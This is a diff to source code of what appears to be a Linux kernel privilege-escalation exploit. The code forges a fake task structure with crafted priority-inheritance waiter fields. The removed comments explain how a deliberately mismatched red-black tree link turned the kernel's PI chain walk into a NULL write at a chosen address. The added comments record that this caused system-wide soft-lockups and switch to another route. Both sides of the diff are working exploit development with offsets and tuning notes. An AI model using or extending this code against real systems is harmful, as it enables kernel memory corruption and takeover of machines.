@@ -454,23 +454,15 @@ namespace ghostlock::support {
             put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_pi_lock_off, 0);
-            /* E6e: link fake_task->pi_waiters with the slot mismatch kept ON
-             * PURPOSE. rb_root_cached = {+0x00 rb_node, +0x08 rb_leftmost}.
-             * The chain walk's reposition ([11] dequeue_pi(fake_task, W)) runs
-             * rb_erase_cached on the waiter's pi_tree_entry slot (+0x18);
-             * pointing the root at the PAGE W0's tree_entry slot (+0x00)
-             * keeps root != node for BOTH candidates (the kernel stale waiter
-             * and the page W0), so every erase takes the normal path and
-             * __rb_change_child writes NULL into the stamped parent
-             * (target-8) -> *(target)=0.  E4's empty tree let the walk
-             * fast-return at fake_task without ever repositioning anyone:
-             * route clean, no write, every time.  The 2026-11-08 link's
-             * (6,8]-call panics came from walk pile-up, not the link itself;
-             * stay <= 6 calls. */
-            const uintptr_t page_w0 =
-                    session::g_exploit_session.heap.current.base + kernel::W0_OFF;
-            put64(p, fake_task_off + ft_pi_wait_off, page_w0 + 0x00);       /* rb_node -> tree_entry slot */
-            put64(p, fake_task_off + ft_pi_wait_off + 0x08, page_w0 + 0x18); /* rb_leftmost -> pi_tree slot */
+            /* E4 baseline (E6e reverted 2026-11-10): empty PI waiters. The
+             * E6e slot-mismatched link made the EDEADLK abort's PI walk loop
+             * fake_task->pi_waiters->fake_w0->fake_lock->owner(fake_task)
+             * forever — the all-CPU soft-lock that killed E11/E11c/E11d before
+             * the select route even armed. The select route stamps the LIVE
+             * waiter's tree fields through the fd_set window; the fake_task
+             * tree must stay a clean terminator. */
+            put64(p, fake_task_off + ft_pi_wait_off, 0);
+            put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
             put64(p, fake_task_off + ft_tg_off, task_group);
             put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
             put64(p, fake_task_off + ft_pi_blocked_off, 0);
